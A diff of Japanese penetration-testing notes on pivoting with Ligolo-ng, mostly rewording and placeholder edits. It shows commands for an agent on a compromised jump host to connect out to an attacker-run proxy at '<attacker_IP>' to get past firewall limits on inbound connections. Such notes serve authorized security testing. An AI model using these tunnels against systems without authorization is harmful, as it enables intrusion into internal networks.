@@ -120,14 +120,14 @@ tcp_connect_time_out 800
 	- proxychainsを使わずにDynamic Port Forwardingが可能なので、**静的リンクのオブジェクトでも実行可能**（＝より多くのツールが使える）
 
 >[!TIP]
->ポートフォワーディング系
+>ポートフォワーディング・トンネリング系でもっとも使いやすい。
 
 >[!NOTE]
 >Go言語のversionが1.20以上でビルドされており、1.19以下のversionでビルドされたバイナリは存在せず、"'GLIBC_2.32' not found"のエラーが出たときは使えないため、[HTTP Tunneling w/ Chisel](#HTTP%20Tunneling%20w/%20Chisel)を使う。
 
 ### Ligolo-ngの仕組み
 
-`ligolo-agent`と`ligolo-proxy`があり、Agentが足場のマシンで、Proxyが攻撃者のマシンで起動する
+`ligolo-agent`と`ligolo-proxy`があり、AgentをJump Hostのマシンで、Proxyを攻撃者のマシンで起動させる。
 
 1. 接続確立
 	侵害されたマシン上で`ligolo-agent`が起動されると、攻撃者のマシンで待機している`ligolo-proxy`に対してTCP/TLS接続を開始する。この「内側から外側へ」の接続方向により、ターゲットネットワークのFWによるインバウンド接続制限を回避しやすくなる。
@@ -141,26 +141,26 @@ tcp_connect_time_out 800
 ## Tunneling w/ Ligolo-ng
 
 1. `sudo apt install`か、[Ligolo-ng release - Github](https://github.com/nicocha30/ligolo-ng/releases)からダウンロードする
+
 2. 攻撃者のマシン上でTUNインターフェースを作成する
 ```zsh
-sudo ip tuntap add user <Attacker_username> mode tun ligolo
+sudo ip tuntap add user <attacker_username> mode tun ligolo
 sudo ip link set ligolo up
 ```
-- `ip a show ligolo`とすると、"ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,==UP==> mtu 1500 qdisc fq_codel state **DOWN** group default qlen 500 link/none "
+- `ip a show ligolo`とすると、"ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,==UP==> mtu 1500 qdisc fq_codel state **DOWN** group default qlen 500 link/none "と表示される
 
 3. Proxyサーバーの起動
 ```zsh
 # githubからインストールした場合は./proxy...
-# Web UIは起動しなくてよい
 ligolo-proxy -selfcert -laddr 0.0.0.0:<ListenPort>
 ```
+- Web UIを起動するか(y/n)と聞かれるが、起動しなくてよい
 
-4. [Ligolo-ng relase - GitHub](https://github.com/nicocha30/ligolo-ng/releases)から足場のマシンのアーキテクチャ・プロセッサに合ったagentバイナリをダウンロードし、転送した上で、足場のマシンでAgentを起動する
-	- [ファイル操作、ユーティリティ](../../Common/ファイル操作、ユーティリティ.md#ファイルの転送)
+4. [Ligolo-ng relase - GitHub](https://github.com/nicocha30/ligolo-ng/releases)からJump Hostのマシンのアーキテクチャ及びプロセッサに合ったagentバイナリをダウンロードし、Jump Hostに転送した上で、Jump HostでAgentを起動する
 ```zsh
 # windowsであってもコマンドは一緒(バイナリのパスは環境に合わせて)
 # githubからインストールした場合は./agent...
-./ligolo-agent -connect <AttackerIP>:<ListenPort> -ignore-cert
+./ligolo-agent -connect <attacker_IP>:<listen_port> -ignore-cert
 ```
 
 5. 攻撃者のマシンで`[INFO] Agent joined`と表示されたことを確認し、セッションに接続して、足場のマシンのローカルNW側 cidrを特定する(`ligolo-ng >`プロンプト)
@@ -169,7 +169,7 @@ ligolo-proxy -selfcert -laddr 0.0.0.0:<ListenPort>
 session
 
 # セッションに接続
-session <Session ID>
+session <Session_ID>
 
 # 足場マシンのローカルNW側インターフェースを特定
 ifconfig
